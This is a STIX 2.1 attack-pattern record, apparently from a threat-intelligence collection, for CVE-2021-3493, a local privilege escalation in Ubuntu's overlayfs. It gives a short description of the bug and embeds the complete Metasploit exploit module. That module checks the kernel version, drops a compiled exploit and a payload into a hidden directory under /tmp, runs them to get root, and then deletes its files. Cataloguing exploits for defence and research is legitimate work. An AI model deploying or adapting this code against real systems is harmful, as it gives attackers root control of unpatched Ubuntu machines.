{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c83bfaab-0ef9-455f-8f93-e53136d8273f",
    "created": "2024-08-14T16:59:13.307773Z",
    "modified": "2024-08-14T16:59:13.307777Z",
    "name": "2021 Ubuntu Overlayfs LPE",
    "description": " This module exploits a vulnerability in Ubuntu's implementation of overlayfs. The vulnerability is the result of failing to verify the ability of a user to set the attributes in a running executable. Specifically, when Overlayfs sends the set attributes data to the underlying file system via `vfs_setxattr`, it fails to first verify the data by calling `cap_convert_nscap`. This vulnerability was patched by moving the call to `cap_convert_nscap` into the `vfs_setxattr` function that sets the attribute, forcing verification every time the `vfs_setxattr` is called rather than trusting the data was already verified.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/cve_2021_3493_overlayfs.rb",
            "external_id": "cve_2021_3493_overlayfs.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-3493"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/briskets/CVE-2021-3493"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Compile\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => '2021 Ubuntu Overlayfs LPE',\n        'Description' => %q{\n          This module exploits a vulnerability in Ubuntu's implementation of overlayfs. The\n          vulnerability is the result of failing to verify the ability of a user to set the\n          attributes in a running executable. Specifically, when Overlayfs sends the set attributes\n          data to the underlying file system via `vfs_setxattr`, it fails to first verify the data\n          by calling `cap_convert_nscap`.\n          This vulnerability was patched by moving the call to `cap_convert_nscap`\n          into the `vfs_setxattr` function that sets the attribute, forcing verification every time the\n          `vfs_setxattr` is called rather than trusting the data was already verified.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'ssd-disclosure',\n          'bwatters-r7' # Aka @tychos_moose, Metasploit Module\n        ],\n        'DisclosureDate' => '2021-04-12',\n        'Platform' => [ 'linux' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2021-3493' ],\n          [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/' ],\n          [ 'URL', 'https://github.com/briskets/CVE-2021-3493' ]\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'Targets' => [\n          [\n            'x86_64',\n            {\n              'Arch' => [ ARCH_X64 ]\n            }\n          ],\n          [\n            'aarch64',\n            {\n              'Arch' => [ ARCH_AARCH64 ]\n            }\n          ]\n        ],\n        'DefaultTarget' => 0\n      )\n    )\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def check\n    arch = kernel_hardware\n\n    unless arch.include?('x86_64') || arch.include?('aarch64')\n      return CheckCode::Safe(\"System architecture #{arch} is not supported\")\n    end\n\n    release = kernel_release\n    version = kernel_version\n\n    unless userns_enabled?\n      return CheckCode::Safe('Unprivileged user namespaces are not permitted')\n    end\n\n    vprint_good('Unprivileged user namespaces are permitted')\n\n    # If the target is Ubuntu...\n    unless version =~ /[uU]buntu/\n      return CheckCode::Safe('Target is not Ubuntu!')\n    end\n\n    version_array = release.split('-')\n    if version_array.length < 2\n      fail_with(Failure::UnexpectedReply, 'The target Ubuntu server does not have the expected kernel version format!')\n    end\n    vprint_status(\"Version array: #{version_array}\")\n    major_version = Rex::Version.new(version_array[0])\n    vprint_status(\"major_version: #{major_version}\")\n    minor_version = version_array[1]\n    vprint_status(\"minor_version: #{minor_version}\")\n    lower_bound_version = Rex::Version.new(3.13)\n    upper_bound_version = Rex::Version.new(5.14)\n    if major_version > upper_bound_version || major_version < lower_bound_version\n      return CheckCode::Safe(\"The target version #{major_version} is outside the vulnerable version range #{lower_bound_version}-#{upper_bound_version}\")\n    end\n\n    return CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    base_dir = datastore['WritableDir'].to_s\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    exploit_dir = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    exploit_path = \"#{exploit_dir}/#{executable_name}\"\n    if file_exist?(exploit_dir)\n      fail_with(Failure::BadConfig, 'Exploit dir already exists')\n    end\n    mkdir(exploit_dir)\n    register_dir_for_cleanup(exploit_dir)\n\n    # Upload exploit\n    arch = kernel_hardware\n    vprint_status(\"Detected architecture: #{arch}\")\n    if (arch.include?('x86_64') && payload.arch.first.include?('aarch')) || (arch.include?('aarch') && !payload.arch.first.include?('aarch'))\n      fail_with(Failure::BadConfig, 'Host/payload Mismatch; set target and select matching payload')\n    end\n    if live_compile?\n      vprint_status('Live compiling exploit on system...')\n      upload_and_compile(exploit_path, exploit_source('CVE-2021-3493', 'cve_2021_3493.c'))\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      if arch.include?('x86_64')\n        precompiled_binary = 'cve_2021_3493.x64.elf'\n        vprint_status(\"Dropping pre-compiled exploit #{precompiled_binary} on system...\")\n        upload_and_chmodx exploit_path, exploit_data('CVE-2021-3493', precompiled_binary)\n      elsif arch.include?('aarch64')\n        precompiled_binary = 'cve_2021_3493.aarch64.elf'\n        vprint_status(\"Dropping pre-compiled exploit #{precompiled_binary} on system...\")\n        upload_and_chmodx exploit_path, exploit_data('CVE-2021-3493', precompiled_binary)\n      else\n        fail_with(Failure::NoTarget, \"Unknown architecture: '#{arch}'\")\n      end\n\n    end\n    register_file_for_cleanup(exploit_path)\n\n    # Upload payload\n    payload_path = \"#{exploit_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx(payload_path, generate_payload_exe)\n\n    # Launch exploit\n    print_status('Launching exploit...')\n    random_string = rand_text_alphanumeric(5..10)\n    cmd_string = \"#{exploit_path} #{payload_path} #{exploit_dir} #{random_string}\"\n    vprint_status(\"Running: #{cmd_string}\")\n    begin\n      output = cmd_exec(cmd_string)\n      vprint_status(output)\n    rescue Error => e\n      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)\n      print_error(\"Exploit failed: #{e}\")\n    ensure\n      # rmdir() fails here on mettle payloads, so I'm just shelling out the rm for the exploit directory.\n      cmd_exec(\"rm -rf '#{exploit_dir}'\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-04-12",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}